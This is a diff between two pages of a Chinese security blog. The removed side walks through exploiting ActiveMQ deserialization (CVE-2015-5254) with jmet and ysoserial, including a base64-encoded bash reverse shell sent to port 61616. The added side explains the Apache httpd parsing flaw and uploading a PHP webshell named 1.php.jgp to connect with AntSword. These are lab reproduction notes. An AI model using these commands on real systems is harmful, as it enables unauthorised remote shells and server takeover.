@@ -13,7 +13,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      ActiveMQ反序列化漏洞(CVE-2015-5254) | 酷武.
+      Apache Httpd 解析漏洞 | 酷武.
     
   </title>
   <meta name="author" content="小武">
@@ -164,7 +164,7 @@
 	<!-- Page title -->
 	<p>
 		
-			当前文章&nbsp;:&nbsp;《ActiveMQ反序列化漏洞(CVE-2015-5254)》
+			当前文章&nbsp;:&nbsp;《Apache Httpd 解析漏洞》
 		
 	</p>
 
@@ -273,8 +273,8 @@
 	<div class="article-title">
 		<i class="fa fa-paper-plane-o" aria-hidden="true"></i>
 		
-	<a href="/2019/06/13/ActiveMQ反序列化漏洞(CVE-2015-5254)/" itemprop="url">
-		ActiveMQ反序列化漏洞(CVE-2015-5254)
+	<a href="/2019/06/20/Apache Httpd 解析漏洞/" itemprop="url">
+		Apache Httpd 解析漏洞
 	</a>
 
 	</div>
@@ -287,9 +287,9 @@
 
 	发布于
 
-	<a href="/2019/06/13/ActiveMQ反序列化漏洞(CVE-2015-5254)/" itemprop="url">
-		<time datetime="2019-06-13T05:15:40.000Z" itemprop="datePublished">
-	  		2019-06-13
+	<a href="/2019/06/20/Apache Httpd 解析漏洞/" itemprop="url">
+		<time datetime="2019-06-20T03:19:35.000Z" itemprop="datePublished">
+	  		2019-06-20
 	  </time>
 	</a>
 	&nbsp;
@@ -305,8 +305,8 @@
 
 	更新于
 
-	<a href="/2019/06/13/ActiveMQ反序列化漏洞(CVE-2015-5254)/" itemprop="url">
-		<time datetime="2019-06-13T05:15:40.000Z" itemprop="dateUpdated">
+	<a href="/2019/06/20/Apache Httpd 解析漏洞/" itemprop="url">
+		<time datetime="2019-06-20T03:19:35.000Z" itemprop="dateUpdated">
 	  		2019-08-15
 	  </time>
 	</a> 
@@ -332,9 +332,7 @@
 	</div>
 
 	<div class="article-content" id="article-content">
-		<p>1.漏洞介绍：<br>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程***者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。</p>
-<p>2.漏洞利用过程如下：<br>①构造可执行命令的序列化对象<br>②作为一个消息，发送到目标61616端口<br>③访问web管理页面，读取信息，触发漏洞</p>
-<p>3.漏洞复现：<br>①.首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。<br>wget <a href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar" target="_blank" rel="noopener">https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</a><br><img src="https://s2.ax1x.com/2019/08/15/mAlpFI.png" alt="mAlpFI.png"><br>mkdir external<br><img src="https://s2.ax1x.com/2019/08/15/mAMtu4.png" alt="mAMtu4.png"><br>②.执行命令<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “touch /tmp/sucess” -Yp ROME 靶机的ip 61616<br><img src="https://s2.ax1x.com/2019/08/15/mA188P.png" alt="mA188P.png"><br>③.它会给你的ID，访问http://你的ip：8161:8161/admin/queues.jsp<br><img src="https://s2.ax1x.com/2019/08/15/mA3tRx.png" alt="mA3tRx.png"><br><img src="https://s2.ax1x.com/2019/08/15/mA36JI.png" alt="mA36JI.png"><br>④.利用方式也很简单，我们只要将命令换成反弹shell语句再利用就行了。不过在这里我们需要一些小技巧来绕过Java的机制。<br>bash -i &gt;&amp; /dev/tcp/靶机IP/8888 0&gt;&amp;1 bese64编码<br><img src="https://s2.ax1x.com/2019/08/15/mA8Cf1.png" alt="mA8Cf1.png"><br>把编码放进去。<br>bash -c {echo,CmJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xOTkuMTkzLzg4ODggMD4mMQ==}|{base64,-d}|{bash,-i}<br>⑤.然后我们是使用同样的命令将payload发送到61616端口。<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -c {echo,CmJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xOTkuMTkzLzg4ODggMD4mMQ==}|{base64,-d}|{bash,-i}” -Yp ROME 靶机ip 61616<br><img src="https://s2.ax1x.com/2019/08/15/mA8J0g.png" alt="mA8J0g.png"><br>⑥.然后我们查看这条消息，触发命令执行，这时我们在靶机上监听端口，即可得到shell。<br><img src="https://s2.ax1x.com/2019/08/15/mA8DXT.png" alt="mA8DXT.png"><br>⑦.成功。</p>
+		<p>漏洞背景：<br>apache通过mod_php来运行脚本，其2.4.0-2.4.29中存在apache换行解析漏洞，在解析php时xxx.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。<br>该漏洞属于用户配置不当产生的漏洞，与具体中间件版本无关。与其说这是漏洞，不如说是apache的特性，就是我们平常所说的从右向左解析是一样的。当apache遇到无法识别解析的文件后缀时，会向前解析，如xxx.php.123.456,在mime.types文件中如果不存在.123/.456这两种后缀，那么apache会将该文件解析为php。同样也可以在httpd.conf文件中更改参数或是直接配置.htaccess。<br>1.这是个上传漏洞。<br><img src="https://s2.ax1x.com/2019/08/15/mADZBn.png" alt="mADZBn.png"><br>2.直接上传个php一句话***后缀名为1.php.jgp，然后用蚁剑连接，就可以了。<br><img src="https://s2.ax1x.com/2019/08/15/mADuNV.png" alt="mADuNV.png"><br>3.复制这个连接，去蚁剑上连接。<br><img src="https://s2.ax1x.com/2019/08/15/mAD3jJ.png" alt="mAD3jJ.png"><br>4.连接上了。<br><img src="https://s2.ax1x.com/2019/08/15/mADJBR.png" alt="mADJBR.png"></p>
 	
 	</div>
 	
@@ -353,10 +351,10 @@
 	<span>
 		<a href="javascript: window.scrollTo(0, 0);">返回顶部</a>
 		
-			<a href="/2019/06/13/Apache ActiveMQ 远程代码执行漏洞 (CVE-2016-3088)分析/" title="Apache ActiveMQ 远程代码执行漏洞 (CVE-2016-3088)分析" rel="prev">
-				&laquo;上一篇
-			</a>
 		
+			<a href="/2019/06/15/利用最新Apache解析漏洞（CVE-2017-15715）绕过上传黑名单/" title="利用最新Apache解析漏洞（CVE-2017-15715）绕过上传黑名单" rel="next">
+				下一篇&raquo;
+			</a>
 			
 	</span>
 
@@ -372,29 +370,6 @@
 <div class="relate-post">
 	
 		<ul>
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2019/06/20/Apache Httpd 解析漏洞/" title="Apache Httpd 解析漏洞">
-								Apache Httpd 解析漏洞			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								六月 20日, 2019				
-							</p>
-							<p class="relate-post-content">
-								漏洞背景：apache通过mod_php来运行脚本，其2.4.0-2.4.29中存在apache换行解析漏洞，在解析php时xxx.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。该漏洞属于用户配置不当产生的漏...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2019/06/20/Apache Httpd 解析漏洞/" title="Apache Httpd 解析漏洞">				
-								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="Apache Httpd 解析漏洞"/>
-							</a>
-						</div>
-					</li>											
-			
 			
 					<li>
 						<div class="relate-post-text">
@@ -461,6 +436,29 @@
 							<a href="/2019/06/13/Apache ActiveMQ 远程代码执行漏洞 (CVE-2016-3088)分析/" title="Apache ActiveMQ 远程代码执行漏洞 (CVE-2016-3088)分析">				
 								
 								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="Apache ActiveMQ 远程代码执行漏洞 (CVE-2016-3088)分析"/>
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/06/13/ActiveMQ反序列化漏洞(CVE-2015-5254)/" title="ActiveMQ反序列化漏洞(CVE-2015-5254)">
+								ActiveMQ反序列化漏洞(CVE-2015-5254)			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 13日, 2019				
+							</p>
+							<p class="relate-post-content">
+								1.漏洞介绍：Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/06/13/ActiveMQ反序列化漏洞(CVE-2015-5254)/" title="ActiveMQ反序列化漏洞(CVE-2015-5254)">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="ActiveMQ反序列化漏洞(CVE-2015-5254)"/>
 							</a>
 						</div>
 					</li>											
